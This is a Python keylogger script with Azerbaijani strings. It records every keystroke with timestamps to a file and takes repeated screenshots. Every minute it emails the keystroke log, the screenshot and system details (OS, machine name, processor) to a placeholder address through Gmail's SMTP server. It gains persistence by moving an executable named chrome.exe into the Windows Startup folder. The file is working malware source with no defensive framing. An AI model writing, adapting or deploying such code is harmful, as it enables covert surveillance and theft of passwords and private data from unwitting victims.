import pyautogui
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import time
import platform
from pynput.keyboard import Listener
import datetime
import threading
import getpass
import shutil

p = "C://Users/"+str(getpass.getuser())+"/SysInfo/"
try:
    shutil.move("chrome.exe" ,"c://users/"+str(getpass.getuser())+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/chrome.exe")
except FileNotFoundError:
    pass
txt = """Bu e-mail keylogger terefinden gonderilmishdir
Sistem:{}\nEmeliyyat Sistemi:{}\nKomputerin adi:{}
\nProsessor:{}"""

a = datetime.datetime.today()

img = p+ "a1.png"

def on_press1(key):
    print(key)
    s = datetime.datetime.today()
    u = str(s.year)+"-"+str(s.month)+"-"+str(s.day)+"  "+str(s.hour)+":"+str(s.minute)+":"+str(s.second)
    with open(p+"p.txt" , "a") as f:
        f.write(str(u)+" => "+str(key)+"\n")
def listen():
    with Listener(on_press = on_press1) as listener:
        listener.join()
try:
        
    def SendMail(img):
        global a
        while True:
            pyautogui.screenshot(img)
            b = datetime.datetime.today()-a
            if b.seconds >60:
                img_data = open(img, 'rb').read()
                msg = MIMEMultipart()
                msg['Subject'] = 'Keylogger 1.0'
                msg['From'] = 'Gonderen E-mail'
                msg['To'] = 'Alacaq E-mail'
                with open(p+"p.txt" , "r") as d:
                    g1 = d.read()
                g1 = MIMEText(g1)
                text = MIMEText(str(txt).format(platform.system(),platform.platform(),platform.uname()[1],platform.uname()[5]))
                msg.attach(text)
                msg.attach(g1)
                image = MIMEImage(img_data)
                msg.attach(image)
                s = smtplib.SMTP("smtp.gmail.com", "587")
                s.ehlo()
                s.starttls()
                s.ehlo()
                s.login("Gonderen E-mail", "Parol")
                s.sendmail("Gonderen E-mail", "Alacaq E-mail", msg.as_string())
                print("Gonderildi")
                with open(p+"p.txt" , "w") as d2:
                    d2.write("")
                a = datetime.datetime.today()
except:
    pass

t1 = threading.Thread(target = listen)
t2 = threading.Thread(target = SendMail , args=(img,))

t1.start()
t2.start()

t1.join()
t2.join()
